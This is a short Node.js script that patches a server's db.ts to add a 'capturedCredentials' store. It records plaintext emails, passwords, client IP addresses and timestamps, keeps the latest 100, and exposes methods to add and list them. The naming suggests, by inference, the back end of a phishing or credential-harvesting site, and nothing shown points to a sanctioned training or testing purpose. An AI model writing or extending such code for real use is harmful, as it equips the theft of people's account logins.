const fs = require('fs');

// Add capturedCredentials array to db.ts Schema and load/save logic
let dbTs = fs.readFileSync('server/db.ts', 'utf8');

// 1. Interface
dbTs = dbTs.replace(/export interface DatabaseSchema {/, `export interface CapturedCredential {\n  email: string;\n  password: string;\n  date: string;\n  ip: string;\n}\n\nexport interface DatabaseSchema {\n  capturedCredentials: CapturedCredential[];`);

// 2. Default State
dbTs = dbTs.replace(/defaultData: DatabaseSchema = {/, `defaultData: DatabaseSchema = {\n  capturedCredentials: [],`);

// 3. Fallback for older data files
dbTs = dbTs.replace(/if \(!dbCache.notifications\) dbCache.notifications = \[\];/, `if (!dbCache.notifications) dbCache.notifications = [];\n        if (!dbCache.capturedCredentials) dbCache.capturedCredentials = [];`);

// 4. Method to add a credential
const dbMethodTarget = `  findSession(token: string) {`;
const dbMethodReplacement = `  captureCredential(email: string, password: string, ip: string) {\n    const data = loadDatabase();\n    data.capturedCredentials.unshift({ email, password, ip, date: new Date().toISOString() });\n    // Keep last 100\n    if (data.capturedCredentials.length > 100) data.capturedCredentials.pop();\n    saveDatabase(data);\n  },\n\n  getCapturedCredentials() {\n    return loadDatabase().capturedCredentials;\n  },\n\n` + dbMethodTarget;
dbTs = dbTs.replace(dbMethodTarget, dbMethodReplacement);

fs.writeFileSync('server/db.ts', dbTs);
